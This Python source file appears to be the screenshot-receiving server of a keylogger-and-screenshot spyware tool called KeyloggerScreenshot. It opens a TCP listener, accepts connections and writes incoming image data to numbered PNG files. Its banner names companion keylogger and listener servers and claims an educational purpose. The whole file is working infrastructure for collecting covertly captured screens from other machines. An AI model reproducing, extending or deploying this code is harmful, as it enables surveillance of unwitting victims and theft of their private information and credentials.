import socket
import os
import BetterPrinting as bp
from .Port_data import Ports

class ServerPhotos:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.full_msg = None

    def check_double(self):  # This function is here to check if there are more files with the same name
        dir = os.listdir()
        check = [each_name for each_name in dir if "New_Image" in each_name]
        if len(check) == 0: filename = "New_Image (1).png"
        else:
            amount = len(check) + 1
            filename = f"New_Image ({amount}).png"

        return filename

    def get_data(self, connection, mode, bytes):
        if mode == "r": self.full_msg = r""
        else: self.full_msg = b""
        # All the data is being stored in full_msg
        while True:
            msg = connection.recv(bytes)
            if len(msg) <= 0: break
            if mode == "r": self.full_msg += msg.decode()
            else: self.full_msg += msg
        return self.full_msg

    def start(self):
        gui = """
    __ __              __                                 _____                                       __            __ 
   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
 / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
            /____/           /____/ /____/    

                        ~Created by: Fawaz Bashiru~          
                        ~Write "python KLS_start.py -help" for help in the github version~   
                        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
                        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!                        
        """

        print(gui)
        bp.color("Cyan: ServerPhotos", "cyan")
        bp.color("Blue: ServerKeylogger", "magenta")
        bp.color("Green: ServerListener", "green")
        print("White: Timer\n")
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(1000)

            anzahl = 0
            while True:
                bp.color("Waiting for connection...", "cyan")
                client_socket, address = server.accept()
                bp.color(f"\n\nConnection has been established with {address}", "cyan")
                # Data is in client_socket and the address is obviously in "ipaddress"
                full_msg = self.get_data(client_socket, "b", 8192)
                client_socket.close()
                anzahl += 1

                filename = self.check_double()
                with open(filename, "ab") as file:
                    # This stores the image
                    file.write(full_msg)

                # "anzahl" is for the amount of photos
                if anzahl > 1:
                    bp.color(f"{anzahl} Images has been saved to your working directory", "cyan")
                else:
                    bp.color(f"{anzahl} Image have been saved to your working directory", "cyan")
                # Detetcts how many Image have been saved to your directory


        except OSError:
            working_port = Ports.get_working_ports()
            if str(self.port) in working_port:
                bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERPHOTOS. PORT NUMBER: {self.port} already in use", "cyan")
                os._exit(0)
                
